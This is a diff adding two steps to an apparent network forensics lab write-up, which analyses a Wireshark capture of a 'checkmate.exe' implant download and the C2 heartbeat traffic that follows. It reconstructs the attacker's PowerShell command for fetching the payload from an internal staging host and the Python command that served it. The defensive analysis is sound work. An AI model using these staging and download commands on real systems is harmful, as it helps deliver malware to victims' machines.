@@ -145,3 +145,96 @@ Submitted to **VirusTotal** — no matches found.
 The attacker compiled `checkmate.exe` specifically for this operation.
 
 ---
+### Step 4 — Following the TCP Stream
+
+I followed the TCP stream of the `checkmate.exe` download:
+```
+Right click packet 4960 → Follow → TCP Stream
+```
+
+> <img width="609" height="160" alt="3m4" src="https://github.com/user-attachments/assets/dd199e00-66f3-4475-abe4-1cb375a58305" />
+
+```
+GET /checkmate.exe HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1432
+Host: 10.0.0.155:8000
+
+HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.12.8
+Content-type: application/x-msdos-program
+Content-Length: 99328
+```
+
+Three critical findings in one stream:
+
+**1 — PowerShell User-Agent**
+
+This was not a browser. **PowerShell** downloaded `checkmate.exe` — meaning the attacker executed something like:
+```powershell
+(New-Object System.Net.WebClient).DownloadFile('http://10.0.0.155:8000/checkmate.exe','checkmate.exe')
+```
+
+**2 — Python SimpleHTTP Staging Server**
+```
+Server: SimpleHTTP/0.6 Python/3.12.8
+```
+
+The attacker hosted the payload using:
+```bash
+python3 -m http.server 8000
+```
+
+Not a legitimate web server. An attacker's staging server running inside the network on port 8000.
+
+**3 — Internal IP = Lateral Movement**
+```
+Host: 10.0.0.155:8000
+```
+
+Payload came from an internal IP. `10.0.0.155` was already compromised before this traffic. The attacker pivoted from `.155` to deliver the implant to `.156`.
+
+---
+
+### Step 5 — C2 Beaconing Pattern
+
+After `checkmate.exe` was delivered I filtered traffic between the two internal IPs:
+```
+Filter: http && ip.addr == 10.0.0.155 && ip.addr == 10.0.0.156
+```
+
+> <img width="594" height="350" alt="5m" src="https://github.com/user-attachments/assets/2910d907-c0c1-4b8a-ba67-338ef390a1b6" />
+
+The pattern was immediately obvious:
+```
+6418  →  10.0.0.156 → 10.0.0.155   POST  287 bytes   ← registration beacon
+6421  →  10.0.0.155 → 10.0.0.156   HTTP  174 bytes   200 OK
+6572  →  10.0.0.156 → 10.0.0.155   POST   74 bytes   ← heartbeat
+6574  →  10.0.0.155 → 10.0.0.156   HTTP  182 bytes   200 OK
+6685  →  10.0.0.156 → 10.0.0.155   POST   74 bytes   ← heartbeat
+6687  →  10.0.0.155 → 10.0.0.156   HTTP  182 bytes   200 OK
+```
+
+| Observation | Conclusion |
+|---|---|
+| Same 74 byte size every POST | Automated heartbeat — not human activity |
+| ~2 second interval | C2 sleep timer configured at 2 seconds |
+| Always POST | C2 communication protocol |
+| First beacon 287 bytes | Registration — victim introducing itself to C2 |
+
+To visualize this I used Wireshark's I/O Graph:
+```
+Statistics → I/O Graph
+Filter: http && ip.addr == 10.0.0.155 && ip.addr == 10.0.0.156
+```
+
+> <img width="613" height="244" alt="6mm" src="https://github.com/user-attachments/assets/e7b82872-28d8-4971-ad56-9818f40051c5" />
+
+```
+0 – 43 seconds    →  flat line       ← no C2 activity
+~43 seconds       →  single spike    ← checkmate.exe downloaded
+50 – 179 seconds  →  perfect rhythm  ← C2 heartbeat, never stops
+```
+
+Machine precision. Every 2 seconds. This is what active C2 looks like on a network.
+
+---
